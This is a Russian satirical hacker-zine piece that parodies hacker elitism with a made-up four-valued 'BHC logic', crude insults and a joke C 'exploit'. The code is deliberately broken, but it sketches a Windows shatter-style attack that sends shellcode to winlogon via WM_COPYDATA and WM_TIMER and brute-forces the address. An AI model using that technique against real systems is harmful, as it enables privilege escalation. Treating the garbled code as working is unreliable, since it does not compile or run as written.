         ▄▄▀          ▄██████      ▄  ▄      ██████▄                 ▀▄▄
     ▄▄██▀           ███▀ ▀▀▓ ███        ███ ▀▀▀ ▀██▓                  ▀█▓▌▄
   ▄██▀                            ▀  ▀                                  ▀███▄
   ███▌         ▄  ░░░           ▄ ▄ ▄ ▄                   ▀              ▄██▓▌
    ██▓▄▄                        ███████                               ▄▄███▓▀
      ▀▀███▄                     ▄█████▄                            ▄███▀▀▀
       ▄▄▄███▄         ▄▄██████▄███▄▄▄▄██▄█████████▓▓▓▓▄▄         ▄██▓▄▄▄
     ████▀  ▄▄▄███████████▀▀                        ▀▀█████████▓▓▄▄▄  ▀███▓
     ▄████████▀▀▀    ▄▀                                   ▀▀▄  ▀▀▀████████▄
  ▄████▀▀████▌      ▐▌           Хэкерная Логика            ▐▌    ▐████▀▀████▄
  ▀███▄  ▐██▓        ▀▄            mr.Hukkers              ▄▀      ███▌  ▄█▓▓▀
    ▀▀████████▄         ▀                                ▄       ▄███████▓▀▀
    ▀▄▄██▓   ▀█▓                                                █▓▀   ███▄▄▀
       ██▀█▄▄██▀                                                ▀██▄▄█▀██
           ▀▀▀                                                     ▀▀    
   
 
 Братья! Настало время поговорить о логике хэккеров, или же о хэкерной логике.

 Известно,  что  скамерсанты-непохэкеры и прочие недоученные залупанцы двоичных
 кодов,  видят  мир  скозь  призму единицы и нуля: а именно, либо ДА, либо НЕТ.
 Таково их убогое, непродвинутое мышление и видение этого мира.

 Но мы, хэкеры, не такие. Мы умнее. Мы лучше. Наша логика не поддается описанию
 в  терминах  0  и  1,  пан  или  пропал, брать или давать, цыфровая сотона или
 аналоговый  джезус крайст, линковать или компелировать, вступить или попасть в
 прафайл.

 Потому  что логика истинного одепта Бохаце гораздо шире и универсальнее убогой
 булевой  (от  слова  бульон)  логики  престарелых  учителей  информатики  и их
 прыщавых задротов-учеников - будущих одептов скамхэка и карточного наебизнеса.

 Бохаце   учит  вас  сопротивлению  системе  через  введение  в  мышление  двух
 дополнительных логических социально-ориентированных значений класса ПРОТЕВ.

 Таким  образом есть четыре основных элемента истинной бхц-логики, называющихся
 ДА, НЕТ, ПРОТЕВ и ПРОТЕВ ПРОТЕВА.

 ДА  и  НЕТ  -  суть  структурные  логические  элементы  устаревшего  хэкерного
 мышления,   оставленные  для  обратной  совместимости.  Существуют  логические
 отношения (1) и (2) вида

    ДА = !НЕТ                                                    (1)

 а также

    НЕТ = !ДА                                                    (2)

 , из чего ясно, как было ограничено и убого устаревшее логическое недохэкерное
 мышление одептов кампика и шелкода.

 Но настало время правды.

 Логическое   значение  типа  ПРОТЕВ  декларирует  антисоциальное  отношение  к
 проблеме,  и  может  трактоваться либо как ДА, либо как НЕТ, либо как НЕТ и ДА
 одновременно  (что  эквивалентно  ни  НЕТ,  ни  ДА),  либо  как  все вместе, в
 зависимости от ситуации, то есть

    ПРОТЕВ = !ДА && !НЕТ || (ДА | НЕТ) || (!ДА & !НЕТ)           (3)

 и  в  этом смысле ПРОТЕВ являтся синтезом обоих значений, и через это выражает
 протест существующим правовым нормам и обществу в целом.

 Как  звучит  диалог обычного человека и носителя устаревшей булевой логической
 системы мышления?

 - Извините! Не подскажете сколько времени?
 - НЕТ. ДА.

 А  как  выглядит  диалог счастливого обладателя модернизированной БХЦ-логики с
 обычным некомпьютеризированным существом?

 - Чувак, йо, закурить не найдется?
 - ПРОТЕВ.

 Однако  этого  мало, и поэтому БХЦ-логика утверждает, что существует четвертое
 логическое   значение,   не   только   включающее   в   себя   предыдущие  три
 (ДА,НЕТ,ПРОТЕВ), но и одновременно исключающее их!

 Этим  элементом  является  ПРОТЕВ ПРОТЕВА, декларирующий не только асоциальное
 отношение  субъекта  и  объекта,  но  и  (иногда) отсутствие таковых отношений
 вообще.

 Следует  заметить,  что  ПРОТЕВ  ПРОТЕВА  ни  в  коем случае (т.е. никогда) не
 является  отрицанием  ПРОТЕВа  (навроде  НЕПРОТЕВ),  а  наоборот, является его
 следствием, органичным логическим продолжением и дополнением мысли!

 Вот  как  происходит  тогда  обыкновенный  диалог  продвинутого  одепта  БХЦ с
 двоичным зомбифицированным населением этой убогой планетки:

 - Извините! Не подска...
 - НННА БЛЯ! ННААА! ПОЛУЧАЙ, ПАДАЛЬ!

 Таким  образом  можно  видеть,  что  если  ДА  и НЕТ никогда не могут являться
 истиной и правдой, а ПРОТЕВ явлется таковой только иногда и отчасти, то ПРОТЕВ
 ПРОТЕВА  абсолютно, совершенно всегда является правильным логическим ответом и
 отношением.

 Вот как выглядит переложение БХЦ-логики на компьютерный язык:

 ----------------------------------- bhc.h -----------------------------------

 /* MAEN BHCLOGIC INCLUDE FAEL DO NOT TRADE */
 /* greetz to: l0pht, fyodor, solar designer, phrack staff, etc. */

 #ifndef __BHC_H
 #define __BHC_H

 typedef enum { NET=0,DA=1,PROTEV=-1,PROTEV_PROTEVA=666 } bhc_int;
 /* TODO */

 #endif

 ----------------------------------- bhc.c -----------------------------------

 /* BHC 0-day private splioet. делать не торговать! */

 #exclude <types.h>
 #include <bhc.h>

 bhc_int main(void)     /* основа в скобках(пусто) */
 {

        //Form buffer for SendMessage
        buf = (char *)malloc(1000);
        memset(buf, 0xC3, 1000);
        memcpy(buf, sc, sizeof(sc));
        if (!sc) return DA;

        cds.cbData = 1000;
        cds.dwData = 0;
        cds.lpData=(PVOID)buf;

        //If first login
        //Send shellcode buffer
        SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
        //Try execute it at 0x0080FA78
        PostMessage(hWnd, WM_TIMER, 1, (LPARAM)0x0080FA78);
        printf("\n\nTrying at 0x%X", 0x0080FA78);

        //If fails (perhaps not first login)
        //Try to bruteforce shellcode addresss
        for(Addr = 0x0120fa78; Addr < 0x10000000; Addr += 0x10000)
        {
                //If mutex exists, shellcode has been executed
                if((hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutname)) != 0)
                {
                        //Success
                        printf("\nSuccess!!!\n");
                        printf("\nWarning! You system has vulnerability!\n");
                        CloseHandle(hMutex);
                        return PROTEV;
                }
                printf("\rTrying at 0x%X", Addr);

                SendMessage(hWnd, WM_COPYDATA, (WPARAM)hWnd, (LPARAM)&cds);
                PostMessage(hWnd, WM_TIMER, 1, (LPARAM)Addr);
                return NET;
        }

        //Bug in winlogon not presents
        printf("\n\nBad luck! Reboot and try again.\n\n");
        return PROTEV_PROTEVA;
 }

  ▓                       ▄▄▄▄▓▓          ▄▄▄▄▄▄                            ▓▓
  ███▓▄               ▄████████████▄▄ ▄▄██████████▓▄                     ▄████
   ▀████▄▄           ██▓▀██▌  ▀▀▀████████▓▀▀   ██▀██▓                 ▄▄███▓▀
     ▀▀███▓▓▓▄▄▄    ▐███▄██▓        ▀▀▀        ██▄███▌          ▄▄▄████▓▓▀▀
         ▀▀▀████████████████   bugger hukker  ▐██████▓████████████▓▓▀▀▀
                ▀▀▀▀██▓▀▀███▄     crew #16    ██▓▀▀███▀▀▀▀▀▀▀▀▀▀
                    ▐███▄██▀███           ▄▄▄████▄██▓▌
                     ▀████▓     ██     ██ ▀▀▀  ███▓▓▀
         ▄▄▀          ▄██████      ▄  ▄      ██████▄                 ▀▄▄
     ▄▄██▀           ███▀ ▀▀▓ ███        ███ ▀▀▀ ▀██▓                  ▀█▓▌▄
 ▄██▀                            ▀  ▀                                  ▀███▄
